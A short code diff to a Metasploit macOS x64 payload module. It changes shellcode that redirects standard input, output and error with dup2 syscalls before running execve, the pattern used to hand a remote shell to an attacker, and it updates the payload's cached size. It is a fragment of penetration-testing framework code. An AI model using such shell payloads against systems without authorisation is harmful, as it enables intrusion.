@@ -4,7 +4,8 @@
 ##
 
 module MetasploitModule
-  CachedSize = 108
+
+  CachedSize = 128
 
   include Msf::Payload::Single
   include Msf::Payload::Osx
@@ -69,10 +70,13 @@ module MetasploitModule
       syscall
       mov rdi,r12
       mov eax,0x200005a
-      xor rsi,rsi
+      mov rsi,2
       syscall
       mov eax,0x200005a
-      inc rsi
+      mov rsi,1
+      syscall
+      mov eax,0x200005a
+      mov rsi,0
       syscall
       xor rax,rax
       mov eax,0x200003b
